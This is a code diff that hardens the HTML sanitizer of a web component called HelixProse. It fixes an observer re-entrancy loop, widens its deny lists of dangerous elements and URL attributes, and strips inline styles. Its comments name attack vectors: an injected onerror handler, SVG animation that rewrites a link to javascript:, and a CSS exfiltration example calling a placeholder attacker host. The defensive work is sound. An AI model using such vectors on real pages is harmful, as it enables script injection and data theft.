@@ -193,26 +193,35 @@ export class HelixProse extends HelixElement {
 
   // ─── Sanitization (opt-in) ───
 
+  /**
+   * (Re)attaches the mutation observer with the standard config. Shared between
+   * initial start and the post-sanitize re-attach so the two cannot drift.
+   * Watches the full subtree: nodes, attributes, and characterData can all carry
+   * injected attack vectors (e.g. an `onerror` added to an existing <img>).
+   * @internal
+   */
+  private _observeSanitize(): void {
+    this._sanitizeObserver?.observe(this, {
+      childList: true,
+      subtree: true,
+      attributes: true,
+      characterData: true,
+    });
+  }
+
   /** @internal */
   private _startSanitizeObserver(): void {
     if (this._sanitizeObserver) {
       return;
     }
     this._sanitizeObserver = new MutationObserver(() => {
-      // Ignore the mutations our own sanitization rewrite generates.
+      // Secondary guard; the primary defense is detaching during the rewrite.
       if (this._isSanitizing) {
         return;
       }
       this._sanitizeSlottedContent();
     });
-    // Watch the full subtree: nodes, attributes, and characterData can all carry
-    // injected attack vectors (e.g. an `onerror` added to an existing <img>).
-    this._sanitizeObserver.observe(this, {
-      childList: true,
-      subtree: true,
-      attributes: true,
-      characterData: true,
-    });
+    this._observeSanitize();
   }
 
   /** @internal */
@@ -228,8 +237,18 @@ export class HelixProse extends HelixElement {
    * @internal
    */
   private _sanitizeSlottedContent(): void {
-    // Re-entrancy guard: replacing outerHTML mutates the subtree the observer watches.
+    // Synchronous re-entrancy guard (e.g. connectedCallback + updated() in one tick).
+    if (this._isSanitizing) {
+      return;
+    }
     this._isSanitizing = true;
+    // Detach the observer for the duration of the rewrite. Its callback is delivered
+    // asynchronously (microtask), so the sync `_isSanitizing` flag alone cannot stop
+    // it from re-firing on the mutations WE make — and a non-idempotent custom
+    // sanitizer (e.g. DOMPurify renormalizes already-clean markup, so cleaned !==
+    // original on every pass) would then re-sanitize forever. Detaching means our own
+    // outerHTML swaps queue no records at all.
+    this._sanitizeObserver?.disconnect();
     try {
       const sanitizeFn = this.sanitizer ?? ((markup: string) => this._builtInSanitize(markup));
       // Snapshot first: replacing outerHTML mutates the live children collection.
@@ -244,6 +263,12 @@ export class HelixProse extends HelixElement {
       }
     } finally {
       this._isSanitizing = false;
+      // Resume observing genuinely-new (consumer/CMS) mutations. Skipped when the
+      // observer was never created (first sanitize runs from connectedCallback before
+      // _startSanitizeObserver) or sanitization has since been turned off / detached.
+      if (this._sanitizeObserver && this.sanitize && this.isConnected) {
+        this._observeSanitize();
+      }
     }
   }
 
@@ -263,18 +288,35 @@ export class HelixProse extends HelixElement {
     const template = document.createElement('template');
     template.innerHTML = markup;
 
-    const DANGEROUS_ELEMENTS = ['script', 'style', 'iframe', 'object', 'embed', 'foreignObject'];
-    // `xlink:href` (and any namespaced `*:href`) is URL-bearing on SVG <a>/<use>
-    // and carries the same javascript:/data: risk as `href`/`src` — hx-icon
-    // treats it as dangerous for the same reason.
-    const URL_ATTRS = ['href', 'src', 'xlink:href'];
+    // Compared case-insensitively (localName is camelCase for SVG elements like
+    // foreignObject / animateTransform, lowercase for HTML).
+    const DANGEROUS_ELEMENTS = [
+      'script',
+      'style',
+      'iframe',
+      'object',
+      'embed',
+      'foreignobject',
+      // SVG SMIL animation elements can rewrite a URL-bearing attribute at runtime
+      // (e.g. <animate attributeName="xlink:href" to="javascript:…">), defeating the
+      // static URL-scheme check below — hx-icon strips these for the same reason.
+      'animate',
+      'animatetransform',
+      'animatemotion',
+      'set',
+    ];
+    // URL-bearing attributes that can carry a javascript:/data: scheme. `xlink:href`
+    // (and any namespaced `*:href`) is URL-bearing on SVG <a>/<use>; `formaction`/
+    // `action` fire on form submission. Mirrors hx-icon's _sanitizeSvg allowlist so
+    // hx-prose is not weaker than the documented internal baseline.
+    const URL_ATTRS = ['href', 'src', 'xlink:href', 'formaction', 'action'];
 
     const walk = (root: ParentNode): void => {
       // Static snapshot — we mutate the tree (removeChild) while iterating.
       const els = Array.from(root.querySelectorAll('*'));
       for (const el of els) {
         // Drop disallowed elements wholesale.
-        if (DANGEROUS_ELEMENTS.includes(el.localName)) {
+        if (DANGEROUS_ELEMENTS.includes(el.localName.toLowerCase())) {
           el.remove();
           continue;
         }
@@ -283,6 +325,13 @@ export class HelixProse extends HelixElement {
           const value = attr.value;
           // Strip inline event handlers (onclick, onerror, onload, …).
           if (name.startsWith('on')) {
+            el.removeAttribute(attr.name);
+            continue;
+          }
+          // Strip inline styles. In Light DOM an attacker-supplied `style` enables
+          // CSS-injection exfiltration (e.g. background:url(https://attacker/?leak))
+          // and layout attacks; a conservative backstop drops it wholesale.
+          if (name === 'style') {
             el.removeAttribute(attr.name);
             continue;
           }
